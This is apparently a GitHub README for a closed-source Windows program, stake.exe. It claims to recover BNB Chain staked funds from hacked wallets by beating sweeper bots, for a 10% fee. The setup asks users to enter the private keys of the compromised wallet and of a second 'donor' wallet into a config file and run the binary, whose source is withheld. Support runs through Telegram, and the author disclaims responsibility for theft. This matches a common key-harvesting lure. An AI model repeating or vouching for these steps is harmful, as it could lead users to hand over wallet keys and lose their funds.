# [Читать на русском](https://github.com/hom9kfun/autowithdraw-bypass-bsc-stake/blob/main/README_RU.md)

# 🛡️ Program for Bypassing Automatic Withdrawal of Funds from Hacked Wallets

This program will help you withdraw your funds from the automatic withdrawal that hackers set up on hacked wallets. If you replenish funds for the commission and they are instantly withdrawn to another wallet, leaving you no time to act - this script bypasses such situations, charging only 10% of the total staking withdrawal amount. In the future, if the program is in demand, I plan to reduce the commission to 1%.

# ✔ addendum dated 30.09.2024
yesterday and today, the first person used my program for those who doubt honesty, I will soon record a video and show from the moment of downloading the file to conducting transactions how everything works and that everything is transparent, I also attach the address who receive 10% of comission come from and you can see for yourself how other people use my with a script
[debank link](https://debank.com/profile/0x710023662f3e43e0712e679c121440fc8365b519/history)

## ⚙️ Getting Started

### 1. Setting up `config.json`

Before running the program, fill in the `config.json` file as follows:

- **`private_key_account`**: The private key of the wallet from which you want to withdraw the stake.
- **`private_key_donor`**: The private key of the donor wallet from which BNB will be debited for transactions.
- **`contract_stake_address`**: The contract address where the stake is located (e.g. Pancake Pool).
- **`contract_token_address`**: The contract address of the token that is in the stake (e.g. CAKE Token).
- **`recipient_address`**: The recipient address to which the tokens from the stake will be withdrawn.
- **`transfer_gas_price`**: Fee amount (in Gwei) for a token transfer transaction (default: 1 Gwei).
- **`stake_gas_price`**: Fee amount (in Gwei) for a stake withdrawal transaction (default: 1 Gwei).
- **`stake_balance`**: Your staking balance in the usual format (e.g. if you have 100 BUSD staked, just enter `100`. If the amount is less than 1, separate it with a dot, e.g. `0.523`).
- **`token_transfer_gas_limit`**: Gas limit for stacking output, you need to look at the contract address how much gas the limit takes on average from each contract in different ways, if it is too small, the script will not work
- **`transfer_gas_limit`**: The gas limit for a coin transfer transaction, usually an average of 35000-50000, works by analogy with the function above
- **`withdraw_function_name`**: a very important parameter is the name of the stack output function in the March contract, to find it out you need to go into your smart steak contract and look at any transaction with a request like "claim, withdraw, etc." at the very bottom you will have the "more details" button click it and in the table that opens copy the function and specify it's in the config [*click*](https://imgur.com/a/T5ifKmF)
- **`need_args`**: accepts the parameter `true` or `false` depends on whether there is an argument in your function as indicated in the function above, in short, if there is something like `uint256` or another in parentheses, then the argument is needed and you need to set `true`, and if the parentheses are empty without any text, then the argument is not needed and `false` is set
- **` withdraw_argument`**: the argument directly needed for the execution of the function to find it out, you must look at other transactions with this function following the previous points, this can be done like this [*click*](https://imgur.com/a/rkQgaFu)
- **` rpc_url`**: it is recommended to change the address of the rpc node only if there are any problems with the default one

### Example `config.json`:
```json
{
    "private_key_account": "yourprivatkey",
    "private_key_donor": "yourdonorkey",
    "contract_stake_address": "contract_stake",
    "contract_token_address": "contract_token",
    "recipient_address": "your_recipient_adr",
    "transfer_gas_price": "1 gwei",
    "stake_gas_price": "1 gwei",
    "stake_balance": "your_stake_balance",
    "token_transfer_gas_limit": 110000,
    "transfer_gas_limit": 90000,
    "withdraw_function_name": "withdraw()",
    "need_args": false,
    "withdraw_argument": 0,
    "rpc_url": "https://rpc-bsc.48.club"
}
```

### 🚀 Launch

After filling in the `config.json` file, you can launch the `stake.exe` program. If all parameters are specified correctly, you will see your funds on the specified wallet. 🥳

### 🔒 Safety of use

- **VirusTotal check**: Make sure the `stake.exe` file is safe by checking it on [VirusTotal](https://www.virustotal.com/gui/file/632894fe2d4cd6ff883ce9a1d808c206a9b3884ea87780fbefa31a78dfa05a44). 🔍
- **Source code**: Unfortunately, for obvious reasons, the source code of the program is not available. ❌

### 📞 Support

If the program did not work for you or you have other questions, do not hesitate to write to me in Telegram: [@nevadalzt](https://t.me/nevadalzt). I will try to help you! 💬

or here: [lolz](https://lolz.live/resonancee/)

### 📅 Future updates

- In the near future, I plan to release programs to bypass the automatic withdrawal of **NFT** and regular tokens. 🎉
- Other **EVM networks** will also be added. Stay tuned! 🔔

### ⚠️ Important

The program is intended only for personal wallets to help with the withdrawal of their funds! I am not responsible for theft or anything else committed by my program 🔥
